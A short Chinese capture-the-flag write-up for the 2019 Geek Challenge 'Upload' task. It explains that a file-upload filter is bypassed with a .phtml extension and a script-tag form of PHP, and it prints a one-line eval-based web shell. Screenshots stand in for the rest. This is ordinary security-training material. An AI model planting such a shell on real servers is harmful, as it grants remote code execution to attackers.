# 原创
：  极客大挑战 2019 Upload

# 极客大挑战 2019 Upload

#### 极客大挑战 2019 Upload

## 考点

> 
phtml绕过后缀、script绕过&lt;?


## 思路

> 
先试试传个php，发现不得行！！！<br/> 抓个包挨个尝试发现phtml可以成功，但是显示`&lt;?`被过滤了，尝试使用`&lt;ScrIpt language="php"&gt;@eval($_POST['cmd'])&lt;/ScrIpt&gt;`来绕过，上传成功后骑上我们的马儿~


## Payload

<img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210526195051532.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center"/><br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210526195045913.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center"/><br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210526195100821.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center"/>
